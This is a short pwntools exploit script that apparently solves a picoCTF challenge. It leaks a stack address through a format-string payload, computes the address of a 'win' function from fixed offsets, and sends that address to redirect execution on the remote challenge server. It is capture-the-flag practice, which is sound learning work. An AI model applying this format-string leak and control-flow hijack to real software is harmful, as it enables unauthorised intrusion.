from pwn import *

p=connect('rescued-float.picoctf.net', 50372)
#p=process('./vuln')
win=0x36a
p.recvuntil(b'Enter your name:')
p.sendline(b'%19$p')
leak=p.recvline().strip()
log.info(f"Leak: {leak}")
addr = int(leak, 16)
log.success(f"Parsed address: {hex(addr)}")
win_addr=addr-0x441+0x36a
log.success(f"Win address: {hex(win_addr)}")
p.recvuntil(b'0x12345: ')
p.sendline(hex(win_addr).encode())
p.interactive()
